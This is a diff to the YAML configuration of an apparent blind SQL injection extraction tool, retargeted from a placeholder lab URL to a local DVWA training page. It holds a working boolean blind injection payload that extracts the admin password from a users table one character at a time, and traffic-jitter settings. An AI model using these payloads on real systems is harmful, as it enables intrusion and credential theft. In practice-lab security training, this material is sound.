@@ -1,18 +1,5 @@
 target:
-  url: "https://LAB-URL-HERE/"
-
-injection:
-  type: "cookie"        # cookie / param / header
-  name: "TrackingId"    # change per target
-  base_value: ""
-
-inference:
-  true_string: "Welcome back!"
-
-extraction:
-  charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-  max_length: 25
-  query: "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}"
+  url: "http://localhost:8082/vulnerabilities/sqli_blind/"
 
 network:
   timeout: 10
@@ -20,4 +7,35 @@ network:
 
 traffic:
   jitter_min_ms: 100
-  jitter_max_ms: 400
+  jitter_max_ms: 300
+
+# 🔥 Injection configuration
+injection:
+  type: "param"        # param | cookie | header
+  name: "id"
+  method: "GET"        # GET | POST
+
+# 🔥 Request structure (generic)
+request:
+  params:
+    Submit: "Submit"
+  headers: {}
+  cookies: {}
+
+# 🔥 Detection configuration
+inference:
+  type: "string"       # string | length | time
+  true_string: "exists"
+  threshold: 2
+
+# 🔥 Extraction configuration (fully generic)
+extraction:
+  charset: "abcdefghijklmnopqrstuvwxyz0123456789_@.-"
+  max_length: 32
+  query: "' AND SUBSTRING(({query}),{pos},1)='{char}'-- "
+  base_query: "SELECT password FROM users WHERE user='admin'"
+
+# 🔥 Logging
+logging:
+  text_log: "logs/output.log"
+  json_log: "logs/output.json"
